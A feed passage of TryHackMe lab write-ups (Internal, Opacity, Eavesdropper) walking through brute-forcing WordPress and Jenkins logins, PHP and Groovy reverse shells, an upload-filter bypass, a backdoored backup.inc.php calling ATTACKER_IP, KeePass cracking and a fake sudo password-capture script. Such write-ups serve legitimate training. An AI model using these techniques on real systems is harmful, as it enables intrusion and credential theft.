+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ hydra internal.thm http-form-post "/blog/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&amp;testcookie=1:Error" -l admin -P /usr/share/wordlists/rockyou.txt -w 5 -o hydra.log -vv# Hydra v9.4 run at 2023-04-14 15:36:50 on internal.thm......[80][http-post-form] host: internal.thm   login: admin   password: [REDACTED]</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Reverse shell</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>Since I was able to gain administrative access to Wordpress, I had access to its theme editor functionality, which allowed me to inject a PHP reverse shell into any page. I downloaded the PHP reverse shell from <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank" rel="noopener" title="">pentestmonkey</a>, configured a netcat listener on my local machine, edited the IP and port in the PHP script, and opened the 404 template in Wordpress' Theme Editor. By replacing the contents of the page with the reverse shell and directing my browser to a non-existent blog page, I was able to obtain a shell as the <code>www-data</code> user on the target machine.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Since Python3 is installed on the target I used it to get a stable shell and then took a look on the system:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">www-data@internal:/$ lsbin    dev   initrd.img      lib64	 mnt   root  snap      sys  varboot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuzcdrom  home  lib	     media	 proc  sbin  swap.img  usr  vmlinuz.oldwww-data@internal:/$ ls /homeaubreannawww-data@internal:/$ ls /var/wwwhtmlwww-data@internal:/$ ls /var/www/htmlindex.html  wordpresswww-data@internal:/$ ls /optcontainerd  wp-save.txt</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>While looking around, I stumbled upon a file named "wp-save.txt" in the /opt directory. To my surprise, it contained login credentials for the user "aubreanna":</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">www-data@internal:/$ cat /opt/wp-save.txtBill,Aubreanna needed these credentials for something later.  Let her know you have them and where they are.aubreanna:[REDACTED]</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>Now that we have the login credentials for the user "aubreanna," we can log in via SSH and obtain a proper shell. Upon accessing the home directory of the user, we discovered the user flag and a file named "jenkins.txt" with the following content:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">aubreanna@internal:~$ cat jenkins.txt Internal Jenkins service is running on 172.17.0.2:8080</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Root access with Jenkins</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>Jenkins is a popular open-source automation server that helps to automate various parts of the software development process. It is primarily used for building, testing, and deploying software projects.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>To gain access to the Jenkins instance, I established an SSH tunnel utilizing the credentials of "aubreanna":</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>With the SSH tunnel set up, I can now access the remote Jenkins instance by navigating to <a href="http://localhost:8080">http://localhost:8080</a> on my local machine, giving me the ability to interact with Jenkins as if I were directly in front of the target computer.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>After conducting a quick search on Google, I discovered that the default credentials for Jenkins are "admin" and "password." I decided to use THC Hydra once again to attempt to brute force the "admin" account:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ hydra 127.0.0.1 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt -w 5 -o hydra-jenkins.log...[8080][http-post-form] host: 127.0.0.1   login: admin   password: [REDACTED]</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>Jenkins has a useful feature that allows for the execution of custom scripts written in Groovy. Upon conducting further research online, I came across a straightforward <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76" target="_blank" rel="noopener" title="">reverse shell script</a> that may allow me to obtain root privileges:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ nc -vlnp 9002listening on [any] 9002 ...connect to [10.8.46.10] from (UNKNOWN) [10.10.102.160] 36538whoamijenkinsls -alh /total 84Kdrwxr-xr-x   1 root root 4.0K Aug  3  2020 .drwxr-xr-x   1 root root 4.0K Aug  3  2020 ..-rwxr-xr-x   1 root root    0 Aug  3  2020 .dockerenvdrwxr-xr-x   1 root root 4.0K Aug  3  2020 bindrwxr-xr-x   2 root root 4.0K Sep  8  2019 bootdrwxr-xr-x   5 root root  340 Apr 17 16:55 devdrwxr-xr-x   1 root root 4.0K Aug  3  2020 etcdrwxr-xr-x   2 root root 4.0K Sep  8  2019 homedrwxr-xr-x   1 root root 4.0K Jan 30  2020 libdrwxr-xr-x   2 root root 4.0K Jan 30  2020 lib64drwxr-xr-x   2 root root 4.0K Jan 30  2020 mediadrwxr-xr-x   2 root root 4.0K Jan 30  2020 mntdrwxr-xr-x   1 root root 4.0K Aug  3  2020 optdr-xr-xr-x 123 root root    0 Apr 17 16:55 procdrwx------   1 root root 4.0K Aug  3  2020 rootdrwxr-xr-x   3 root root 4.0K Jan 30  2020 rundrwxr-xr-x   1 root root 4.0K Jul 28  2020 sbindrwxr-xr-x   2 root root 4.0K Jan 30  2020 srvdr-xr-xr-x  13 root root    0 Apr 17 17:42 sysdrwxrwxrwt   1 root root 4.0K Apr 17 16:55 tmpdrwxr-xr-x   1 root root 4.0K Jan 30  2020 usrdrwxr-xr-x   1 root root 4.0K Jul 28  2020 var</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>It appears that we are currently confined within a Docker container, as indicated by the presence of the .dockerenv file. Nonetheless, while investigating further, I came across an interesting file located in the /opt directory:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">cat /opt/note.txtAubreanna,Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you need access to the root user account.root:[REDACTED]</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>By using these credentials we can login as root on the target machine and get the final flag:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">aubreanna@internal:~$ su -Password: root@internal:~# ls /rootroot.txt  snaproot@internal:~# cat /root/root.txt THM{REDACTED}</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p><!-- /wp:paragraph --></p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>TryHackMe: Opacity write-up</title>
+        <author>
+            <name>andrey</name>
+        </author>
+        <link href="https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-opacity-write-up/"/>
+        <id>https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-opacity-write-up/</id>
+        <media:content url="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/8/tryhackme-banner.jpg" medium="image" />
+            <category term="tryhackme"/>
+            <category term="ctf"/>
+
+        <updated>2023-04-11T07:10:48+02:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/8/tryhackme-banner.jpg" alt="" />
+                    In this article, we're gonna dive into the solution for the "Opacity" challenge. Our goal is to bypass a file-upload filter and exploit Linux permissions&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/8/tryhackme-banner.jpg" class="type:primaryImage" alt="" /></p>
+                <p><!-- wp:paragraph --></p>
+<p>In this article, we're gonna dive into the solution for the "Opacity" challenge. Our goal is to bypass a file-upload filter and exploit Linux permissions to get root access.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Link <a href="https://tryhackme.com/room/opacity" target="_blank" rel="noreferrer noopener">https://tryhackme.com/room/opacity</a></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Difficulty: <code>Easy</code></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Authors: <code>tryhackme</code>, <code>mindsflee</code></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Initial enumeration</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>First, we need to map the machine's IP address to opacity.thm in our hosts file and do an Nmap scan, which reveals the following information:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">...Discovered open port 22/tcp on 10.10.13.142Discovered open port 80/tcp on 10.10.13.142Discovered open port 139/tcp on 10.10.13.142Discovered open port 445/tcp on 10.10.13.142...</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>We discovered an SSH service, a web server, and an SMB service running on the machine. I started the enumeration with enum4linux, but it didn't provide any interesting information. So, I moved on to the web app. Opening opacity.thm in the browser led me to a login page. A review of the source code didn't reveal anything significant, and there was no robots.txt file to guide us to other app pages. I then used GoBuster, which produced these results:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">===============================================================2023/04/10 12:36:26 Starting gobuster in directory enumeration mode===============================================================/index.php            (Status: 302) [Size: 0] [--&gt; login.php]/login.php            (Status: 200) [Size: 848]              /css                  (Status: 301) [Size: 308] [--&gt; http://opacity.thm/css/]/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]                /cloud                (Status: 301) [Size: 310] [--&gt; http://opacity.thm/cloud/]</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Web service exploit and initial access</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>Heading to <code>http://opacity.thm/cloud</code>, we find an image upload service. It needs a URL to upload the image from, which is then saved it in the /cloud/images directory. We might be able to use this to upload a reverse shell script instead of an image.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>I downloaded pentestmonkey's reverse shell and configured the IP and port parameters and then set up a Python3 HTTP server on my machine. When I attempted to upload the shell, I received an error message saying, "Please select an image." In contrast, uploading a standard PNG image proceeded without any problems. This led me to conclude that the web app filters files according to their extensions.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>To gain a better understanding of how the service works, I started a netcat listener and directed the website to it. Here is the output:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ nc -vlnp 8000listening on [any] 8000 ...connect to [10.8.46.10] from (UNKNOWN) [10.10.99.102] 37516GET /demo.png HTTP/1.1User-Agent: Wget/1.20.3 (linux-gnu)Accept: */*Accept-Encoding: identityHost: 10.8.46.10:8000Connection: Keep-Alive</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>Checking the User-Agent field in the headers, it looks like the web app uses wget to download the images. We can guess that the app makes a system call to wget and passes the URL as an argument.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Let's try to bypass the filter by using a '#' symbol at the end of the upload URL and adding some fake image filename at the end, like this: http://YOUR_IP/revshell.php#img.jpg</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>This string will get past the filter because it technically has a valid image extension at the end. However, when passed to wget, this string will be truncated at the # sign (which is a comment in a shell script) and everything after # will be ignored.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>All we have to do now is open a netcat listener on our machine, go to <a href="http://opacity.thm/cloud/images/revshell.php">http://opacity.thm/cloud/images/revshell.php</a>, and bam! We get an initial shell on the target machine as www-data.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Lateral movement and first flag</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>After taking a look in the /home directory and /passwd file, I noticed that there is one user on the system, sysadmin. Inside his home directory, I found the user flag and an interesting directory called scripts, both of which are inaccessible to www-data.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>As I continued to explore the system, I discovered a suspicious file, /opt/dataset.kdbx. I set up a quick Python web server on the target machine and downloaded the file to my machine. We now have a KeePass database file, which is great because we can attempt to crack its master password.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>To do this, I used the keepass2john utility to convert the database file into a hash file for John the Ripper, a popular open-source password cracking tool. Then, I ran John to start the password cracking process:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ keepass2john dataset.kdbx &gt; forjohn$ john --wordlist=/usr/share/wordlists/rockyou.txt forjohnLoaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])Proceeding with single, rules:SinglePress 'q' or Ctrl-C to abort, almost any other key for status7418*****          (dataset.kdbx)1g 0:00:00:02 DONE 1/3 (2023-04-10 14:32) 0.4782g/s 6842Kp/s 6842Kc/s 6842KC/s  12345678..987654321Use the "--show" option to display all of the cracked passwords reliablySession completed</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>Upon successfully accessing the KeePass database, I discovered the password for the 'sysadmin' user. With this information, we can now securely log into the target system using SSH, which provides a more stable and reliable shell compared to the reverse PHP shell we had earlier. Once logged in, we can examine the contents of the 'scripts' directory associated with the 'sysadmin' user and get the user flag.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Root access</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>I proceeded to upload pspy onto the machine and began examining the script.php file located within the "scripts" directory. Pspy disclosed that the root user runs /home/sysadmin/scripts/script.php every 5 minutes.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>A review of the code revealed that the script carries out two tasks: firstly, it compresses the contents of the "scripts" directory and saves the resulting archive as /var/backups/backup.zip; secondly, it removes all files contained in /var/www/html/cloud/images.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>The custom zipData() function in script.php presents a promising opportunity for exploitation to obtain root access. This function is defined in the lib/backup.inc.php file. However, due to insufficient permissions, it appears that we are unable to modify either script.php or backup.inc.php:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">sysadmin@opacity:~/scripts$ ls -alhtotal 16Kdrwxr-xr-x 3 root     root     4.0K Jul  8  2022 .drwxr-xr-x 6 sysadmin sysadmin 4.0K Feb 22 08:16 ..drwxr-xr-x 2 sysadmin root     4.0K Jul 26  2022 lib-rw-r----- 1 root     sysadmin  519 Jul  8  2022 script.phpsysadmin@opacity:~/scripts$ ls -alh libtotal 132Kdrwxr-xr-x 2 sysadmin root 4.0K Jul 26  2022 .drwxr-xr-x 3 root     root 4.0K Jul  8  2022 ..-rw-r--r-- 1 root     root 9.3K Jul 26  2022 application.php-rw-r--r-- 1 root     root  967 Jul  6  2022 backup.inc.php-rw-r--r-- 1 root     root  24K Jul 26  2022 bio2rdfapi.php-rw-r--r-- 1 root     root  11K Jul 26  2022 biopax2bio2rdf.php-rw-r--r-- 1 root     root 7.5K Jul 26  2022 dataresource.php-rw-r--r-- 1 root     root 4.8K Jul 26  2022 dataset.php-rw-r--r-- 1 root     root 3.2K Jul 26  2022 fileapi.php-rw-r--r-- 1 root     root 1.3K Jul 26  2022 owlapi.php-rw-r--r-- 1 root     root 1.5K Jul 26  2022 phplib.php-rw-r--r-- 1 root     root  11K Jul 26  2022 rdfapi.php-rw-r--r-- 1 root     root  17K Jul 26  2022 registry.php-rw-r--r-- 1 root     root 6.8K Jul 26  2022 utils.php-rwxr-xr-x 1 root     root 3.9K Jul 26  2022 xmlapi.php</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>What we <strong>can</strong> modify is the lib directory itself as we are the owner and have read, write, and execute permissions for it. I proceeded to copy the contents of the backup.inc.php file, delete the original file, and create a new version of backup.inc.php containing a reverse shell:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"php"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;?phpini_set('max_execution_time', 600);ini_set('memory_limit', '1024M');function zipData($source, $destination) {        $sock=fsockopen("ATTACKER_IP",9001);        system("sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");}?&gt;</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>Subsequently, I set up a netcat listener on my local machine, and after a brief period, I successfully received a connection back as the root user:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"bash"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">nc -vlnp 9001Listening on [0.0.0.0] (family 0, port 9001)Connection from [10.10.13.142] port 9001 [tcp/*] accepted (family 2, sport 56789)iduid=0(root) gid=0(root) groups=0(root)lsproof.txtsnapcat proof.txt[REDACTED]</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Conclusion</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>In this article, we delved into the "Opacity" challenge, showcasing the process of bypassing a file-upload filter and exploiting Linux permissions to gain root access. Through careful enumeration of the target system, we managed to outsmart the file extension filter and cracked a KeePass database to obtain the 'sysadmin' password. By abusing a custom PHP function we ultimately achieved root access.</p>
+<p><!-- /wp:paragraph --></p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>TryHackMe: Eavesdropper write-up</title>
+        <author>
+            <name>andrey</name>
+        </author>
+        <link href="https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-eavesdropper-write-up/"/>
+        <id>https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-eavesdropper-write-up/</id>
+        <media:content url="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/7/tryhackme-banner.jpg" medium="image" />
+            <category term="tryhackme"/>
+            <category term="ctf"/>
+
+        <updated>2023-04-09T14:56:16+02:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/7/tryhackme-banner.jpg" alt="" />
+                    In this article, we will explore the solution to the "Eavesdropper" challenge, which involves monitoring Linux processes with limited privileges and exploiting the $PATH variable&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/7/tryhackme-banner.jpg" class="type:primaryImage" alt="" /></p>
+                <p><!-- wp:paragraph --></p>
+<p>In this article, we will explore the solution to the "Eavesdropper" challenge, which involves monitoring Linux processes with limited privileges and exploiting the $PATH variable to gain root access on the target system.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Link: <a href="https://tryhackme.com/room/eavesdropper" target="_blank" rel="noreferrer noopener"></a><a href="https://tryhackme.com/room/eavesdropper" target="_blank" rel="noreferrer noopener"></a><a href="https://tryhackme.com/room/eavesdropper" target="_blank" rel="noreferrer noopener">https://tryhackme.com/room/eavesdropper</a></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Difficulty: <code>Medium</code></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Authors: <code>tryhackme</code>, <code>JohnHammond</code>, <code>cmnatic</code>, <code>timtaylor</code></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>We begin the challenge with an SSH private key and a username (frank), which grant us access to the target system. Our objective is to escalate privileges and ultimately attain root access.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>I initiated the challenge by conducting an nmap scan, but the results only revealed the SSH service.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Proceeding to connect to the machine using the provided credentials, I explored the system but found nothing of particular interest. At this point, I decided to utilize pspy (<a href="https://github.com/DominicBreuker/pspy" data-type="URL" data-id="https://github.com/DominicBreuker/pspy">GitHub</a>). This program enables us to view all active processes on the system without requiring root permissions. I set up a Python HTTP server, transferred the tool to the target machine, and executed it. Upon doing so, I observed something intriguing:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":68,"sizeSlug":"large","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-large"><figure class="wp-image-68"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/7/tryhackme-eavesdropper-pspy-screenshot-1024x530.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/7/responsive/tryhackme-eavesdropper-pspy-screenshot-1024x530-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/7/responsive/tryhackme-eavesdropper-pspy-screenshot-1024x530-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/7/responsive/tryhackme-eavesdropper-pspy-screenshot-1024x530-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/7/responsive/tryhackme-eavesdropper-pspy-screenshot-1024x530-lg.png 1024w"></figure></figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>It appears that another user periodically logs into the system as frank and employs sudo to access the /etc/shadow file approximately every 30 seconds.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>The intriguing aspect of this situation is that this other user shares the bash environment with us, and we have full control over various aspects of this environment. One critical element we can manipulate is the $PATH variable, which determines the directories in which the shell searches for executable files. By altering the .bashrc file, which is executed each time a new shell is opened, we can effectively hijack the commands used by the other user.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>The .bashrc file is an important configuration file for the Bash shell, which is the default command-line interface on many Linux and UNIX-based systems. This file is located in each user's home directory and is executed each time a new terminal session or shell is opened. The .bashrc file allows users to customize their shell environment by defining aliases, setting environment variables, adjusting the command prompt, and more.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>In this specific case, our goal is to intercept the sudo command. By modifying the $PATH variable in .bashrc, we can direct the system to execute a custom sudo script that we create, instead of the original sudo command. This allows us to exploit the other user's actions and ultimately escalate our privileges on the target machine.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>I went ahead and tweaked the /home/frank/.bashrc file. Notice "/tmp:" added to the start of the path string, like this:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"bash"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># ~/.bashrc: executed by bash(1) for non-login shells.# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)# for examplesPATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"...</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>With our changes in place, the next time the 'frank' user attempts to execute a command, the system will first search the /tmp directory. If a matching command is found there, the system will execute it, bypassing any subsequent directories in the $PATH.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>At this point I proceeded to create a fake sudo script in the /tmp directory containing the following content:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"bash"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#!/bin/bashread -sp "[sudo] password for $USER: " passvarecho $passvar &gt; /tmp/frank_pwd.txtecho</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>The purpose of this script is to imitate a genuine sudo prompt, request user input, and then store the input in a file named /tmp/frank_pwd.txt. After creating the script, I granted it execution permissions using the command <code>chmod +x /tmp/sudo</code>. To verify if everything is set up correctly, we can either load our modified bash profile by running <code>source ~/.bashrc</code> or log out and log back in. Then, we can test the functionality by executing a sudo command, such as <code>sudo somecommand</code>and observe the content of the /tmp/frank_pwd.txt file.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Now, all that's left to do is wait for a few seconds. As anticipated a frank_pwd.txt file materializes in the /tmp directory, revealing the password for the 'frank' user:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":69,"sizeSlug":"large","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-large"><figure class="wp-image-69"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/7/tryhackme-eavesdropper-franks-password-1024x505.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/7/responsive/tryhackme-eavesdropper-franks-password-1024x505-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/7/responsive/tryhackme-eavesdropper-franks-password-1024x505-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/7/responsive/tryhackme-eavesdropper-franks-password-1024x505-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/7/responsive/tryhackme-eavesdropper-franks-password-1024x505-lg.png 1024w"></figure></figure>
